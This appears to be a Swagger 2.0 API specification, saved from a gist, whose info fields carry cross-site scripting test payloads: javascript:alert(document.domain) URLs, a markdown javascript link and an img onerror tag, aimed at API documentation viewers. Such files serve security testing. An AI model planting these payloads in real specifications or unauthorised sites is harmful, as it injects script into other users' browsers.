// 20241015165628
// https://gist.githubusercontent.com/TakSec/ba9fd2f4dc0cb091b02e3bfa98802f7b/raw/f11cb7d8832beced0cfeba2058367111393ddea3/xsstest.json

{
  "swagger": "2.0",
  "info": {
    "title": "xss test",
    "description": "xss test [Click here](javascript:alert%28document.domain%29) <img src=x onerror=alert(document.domain)>",
    "termsOfService": "javascript:alert(document.domain)",
    "contact": {
      "name": "xss test",
      "email": "xss test",
      "url": "javascript:alert(document.domain)"
    },
    "license": {
      "name": "xss test",
      "url": "javascript:alert(document.domain)"
    },
    "version": "1.0"
  }
}
